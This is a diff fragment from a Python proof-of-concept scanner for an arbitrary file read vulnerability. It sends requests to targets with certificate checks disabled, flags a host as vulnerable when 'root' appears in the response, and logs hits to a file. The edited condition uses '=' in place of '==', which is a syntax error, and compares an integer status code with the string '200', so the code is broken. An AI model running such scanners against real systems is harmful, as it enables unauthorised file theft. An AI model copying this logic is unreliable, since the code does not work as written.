@@ -50,7 +50,7 @@ def poc(target):
     try:
         response1 = requests.get(url, headers=headers, verify=False, timeout=15)
         # print(response1.text)
-        if response1.status_code != "200" and "root" in response1.text:
+        if response1.status_code = "200" and "root" in response1.text:
             print(f"[++++++] {target} 存在 任意文件读取")
             with open("result.txt", "a+", encoding="utf-8") as f:
                 f.write(target + "\n")
